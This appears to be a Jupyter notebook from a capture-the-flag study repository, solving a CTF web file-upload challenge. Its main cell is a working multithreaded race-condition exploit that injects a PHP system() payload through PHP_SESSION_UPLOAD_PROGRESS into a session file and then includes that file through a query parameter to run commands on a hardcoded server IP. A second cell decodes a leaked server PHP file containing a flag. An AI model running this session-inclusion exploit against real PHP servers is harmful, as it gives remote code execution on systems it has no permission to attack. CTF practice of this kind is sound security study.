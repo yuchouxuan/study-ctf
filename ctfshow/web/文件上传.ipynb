{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# session上传"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "import io\n",
    "import requests\n",
    "import threading\n",
    "import random \n",
    "url = 'http://124.221.162.61:10001/'\n",
    "signle = random.randint(0, 65535)\n",
    "def write(session):\n",
    "    data = {\n",
    "        'PHP_SESSION_UPLOAD_PROGRESS': f'<?php system(\"ls /\");?>fucker_{signle}'\n",
    "    }\n",
    "    while True:\n",
    "        f = io.BytesIO(b'a' * 1024 * 10)\n",
    "        response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('dotca.txt', f)})\n",
    "def read(session):\n",
    "    while True :\n",
    "        response = session.get(url+'?🤯=/tmp/sess_flag')\n",
    "        if f'fucker_{signle}' in response.text:\n",
    "            print('[+]',response.text)\n",
    "            break\n",
    "\n",
    "session = requests.session()\n",
    "for i in range(30):\n",
    "    threading.Thread(target=write, args=(session,)).start()\n",
    "for i in range(30):\n",
    "    threading.Thread(target=read, args=(session,)).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'<?php\\n# Just Logging\\n$log_addr = \"log_\" . $_SERVER[\\'REMOTE_ADDR\\'];\\n$log =  $_SERVER[\\'REMOTE_ADDR\\'] . \" \" . date(\"H:i:s\") . \"\\\\n\\\\n\";\\n$log.= \"GET: \" . var_export($_GET, true) . \"\\\\n\";\\n$log.= \"POST: \" . var_export($_POST, true). \"\\\\n\";\\n$log.= \"COOKIE: \" . var_export($_COOKIE, true). \"\\\\n\";\\nfile_put_contents(\"/tmp/\" . $log_addr, $log);\\n# Just Logging\\n?>\\n<?php\\n$flag = \"flag{you_did_it!Dq1FaiuzgzDF}\";'"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import base64\n",
    "base64.b64decode(\"PD9waHAKIyBKdXN0IExvZ2dpbmcKJGxvZ19hZGRyID0gImxvZ18iIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CiRsb2cgPSAgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiICIgLiBkYXRlKCJIOmk6cyIpIC4gIlxuXG4iOwokbG9nLj0gIkdFVDogIiAuIHZhcl9leHBvcnQoJF9HRVQsIHRydWUpIC4gIlxuIjsKJGxvZy49ICJQT1NUOiAiIC4gdmFyX2V4cG9ydCgkX1BPU1QsIHRydWUpLiAiXG4iOwokbG9nLj0gIkNPT0tJRTogIiAuIHZhcl9leHBvcnQoJF9DT09LSUUsIHRydWUpLiAiXG4iOwpmaWxlX3B1dF9jb250ZW50cygiL3RtcC8iIC4gJGxvZ19hZGRyLCAkbG9nKTsKIyBKdXN0IExvZ2dpbmcKPz4KPD9waHAKJGZsYWcgPSAiZmxhZ3t5b3VfZGlkX2l0IURxMUZhaXV6Z3pERn0iOw==\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
